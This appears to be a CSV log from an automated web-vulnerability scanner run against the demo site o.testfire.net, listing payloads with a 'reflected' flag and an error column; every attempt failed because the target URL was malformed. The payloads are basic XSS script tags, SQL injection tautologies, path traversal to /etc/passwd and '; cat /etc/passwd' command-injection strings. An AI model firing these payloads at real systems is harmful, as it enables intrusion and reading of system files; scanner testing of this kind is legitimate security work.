payload,reflected,error
<script>alert(90)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 49=49 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 120=120 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #136,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 93=93 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #142,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #190,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 119=119 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #6,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #119,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 91=91 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #27,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(39)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 192=192 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(157)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #45,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 37=37 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(100)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 54=54 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 176=176 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #64,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #1,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #25,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(15)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 168=168 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #16,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 39=39 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #82,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #42,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #130,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(155)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #147,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #189,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 193=193 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 77=77 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 41=41 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #52,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #174,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(140)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 60=60 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #51,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 117=117 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #145,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #57,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #160,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(8)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(162)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #41,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(146)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #31,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(171)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 135=135 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(26)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(78)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #116,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #3,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 151=151 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #58,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(94)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(120)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 134=134 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #105,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(33)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 1=1 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #170,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 107=107 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #66,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #137,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #34,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(75)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 167=167 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 73=73 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 188=188 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 189=189 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 153=153 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #158,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #108,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 163=163 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 145=145 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(184)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #197,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 139=139 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(98)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 130=130 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #97,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(25)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #76,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 83=83 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(144)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 72=72 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #89,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #102,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #96,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 89=89 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(181)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(158)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(69)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
' OR 185=185 --,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #7,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(95)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
; cat /etc/passwd #8,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(23)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(110)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(176)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
<script>alert(14)</script>,False,Invalid URL 'o.testfire.net)': No scheme supplied. Perhaps you meant https://o.testfire.net)?
